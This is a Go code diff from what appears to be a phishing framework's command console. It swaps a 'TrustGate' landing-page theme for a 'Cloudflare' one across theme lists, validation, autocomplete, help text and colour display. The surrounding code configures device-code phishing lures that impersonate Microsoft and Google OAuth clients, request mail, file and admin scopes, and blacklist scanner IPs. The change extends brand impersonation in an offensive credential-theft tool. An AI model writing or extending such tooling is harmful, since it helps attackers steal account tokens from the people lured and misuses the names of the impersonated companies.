@@ -379,7 +379,7 @@ func (t *Terminal) handleQuickstart(args []string) error {
 		{"", "Default"},
 		{"onedrive", "OneDrive"},
 		{"calendly", "Calendly"},
-					{"trustgate", "TrustGate"},
+		{"cloudflare", "Cloudflare"},
 		{"excel", "Excel Report"},
 		{"sharepoint", "SharePoint"},
 	}
@@ -2103,7 +2103,7 @@ func (t *Terminal) handleLures(args []string) error {
 					{"", "Default"},
 					{"onedrive", "OneDrive"},
 					{"calendly", "Calendly"},
-		{"trustgate", "TrustGate"},
+					{"cloudflare", "Cloudflare"},
 					{"excel", "Excel Report"},
 					{"sharepoint", "SharePoint"},
 				}
@@ -2285,7 +2285,7 @@ func (t *Terminal) handleLures(args []string) error {
 					themeLabels := map[string]string{
 						"onedrive":      "OneDrive",
 						"calendly":      "Calendly",
-						"trustgate":     "TrustGate",
+						"cloudflare":    "Cloudflare",
 						"excel":         "Excel Report",
 						"sharepoint":    "SharePoint",
 					}
@@ -2556,7 +2556,7 @@ func (t *Terminal) handleLures(args []string) error {
 					log.Info("lure '%d' device code template set to: %s", l_id, val)
 				case "dc_theme":
 					val = strings.ToLower(val)
-					validThemes := []string{"default", "onedrive", "calendly", "trustgate", "excel", "sharepoint"}
+					validThemes := []string{"default", "onedrive", "calendly", "cloudflare", "excel", "sharepoint"}
 					valid := false
 					for _, vt := range validThemes {
 						if val == vt {
@@ -2565,7 +2565,7 @@ func (t *Terminal) handleLures(args []string) error {
 						}
 					}
 					if !valid {
-						return fmt.Errorf("edit: invalid theme '%s' (valid: default, onedrive, calendly, trustgate, excel, sharepoint)", val)
+						return fmt.Errorf("edit: invalid theme '%s' (valid: default, onedrive, calendly, cloudflare, excel, sharepoint)", val)
 					}
 					if val == "default" {
 						val = ""
@@ -3236,7 +3236,7 @@ func (t *Terminal) createHelp() {
 				readline.PcItem("dc_client", readline.PcItem("ms_office"), readline.PcItem("ms_teams"), readline.PcItem("azure_cli"), readline.PcItem("ms_outlook"), readline.PcItem("ms_graph"), readline.PcItem("google_cloud_sdk"), readline.PcItem("google_tv"), readline.PcItem("google_device_policy"), readline.PcItem("google_chrome_sync"), readline.PcItem("google_ios")),
 				readline.PcItem("dc_scope", readline.PcItem("full"), readline.PcItem("mail"), readline.PcItem("files"), readline.PcItem("user"), readline.PcItem("minimal"), readline.PcItem("gmail"), readline.PcItem("gdrive"), readline.PcItem("gworkspace"), readline.PcItem("gcalendar"), readline.PcItem("gcontacts"), readline.PcItem("gcloud"), readline.PcItem("gprofile"), readline.PcItem("gadmin"), readline.PcItem("gall")),
 				readline.PcItem("dc_template", readline.PcItem("success"), readline.PcItem("fallback"), readline.PcItem("compliance")),
-				readline.PcItem("dc_theme", readline.PcItem("default"), readline.PcItem("onedrive"), readline.PcItem("calendly"), readline.PcItem("trustgate"), readline.PcItem("excel"), readline.PcItem("sharepoint")))),
+				readline.PcItem("dc_theme", readline.PcItem("default"), readline.PcItem("onedrive"), readline.PcItem("calendly"), readline.PcItem("cloudflare"), readline.PcItem("excel"), readline.PcItem("sharepoint")))),
 			readline.PcItem("delete", readline.PcItem("all"))))
 
 	h.AddSubCommand("lures", nil, "", "show all create lures")
@@ -3265,7 +3265,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("lures", []string{"edit", "dc_client"}, "edit <id> dc_client <client>", "set OAuth client for device code (ms_office, ms_teams, google_cloud_sdk, google_tv, etc.)")
 	h.AddSubCommand("lures", []string{"edit", "dc_scope"}, "edit <id> dc_scope <scope>", "set scope preset (microsoft: full, mail, files | google: gmail, gdrive, gworkspace, gall)")
 	h.AddSubCommand("lures", []string{"edit", "dc_template"}, "edit <id> dc_template <template>", "set interstitial template (success, fallback, compliance)")
-	h.AddSubCommand("lures", []string{"edit", "dc_theme"}, "edit <id> dc_theme <theme>", "set themed landing page (default, onedrive, authenticator, adobe, docusign, sharepoint)")
+	h.AddSubCommand("lures", []string{"edit", "dc_theme"}, "edit <id> dc_theme <theme>", "set themed landing page (default, onedrive, authenticator, adobe, docusign, sharepoint, cloudflare)")
 
 	h.AddCommand("blacklist", "general", "manage automatic blacklisting of requesting ip addresses", "Select what kind of requests should result in requesting IP addresses to be blacklisted.", LAYER_TOP,
 		readline.PcItem("blacklist", readline.PcItem("all"), readline.PcItem("unauth"), readline.PcItem("noadd"), readline.PcItem("off"), readline.PcItem("log", readline.PcItem("on"), readline.PcItem("off"))))
@@ -3763,7 +3763,7 @@ func (t *Terminal) sprintLures() string {
 			dcThemeStr = hiblue.Sprint(dcTheme)
 		case "calendly":
 			dcThemeStr = hcyan.Sprint(dcTheme)
-		case "trustgate":
+		case "cloudflare":
 			dcThemeStr = color.New(color.FgHiRed).Sprint(dcTheme)
 		case "excel":
 			dcThemeStr = yellow.Sprint(dcTheme)
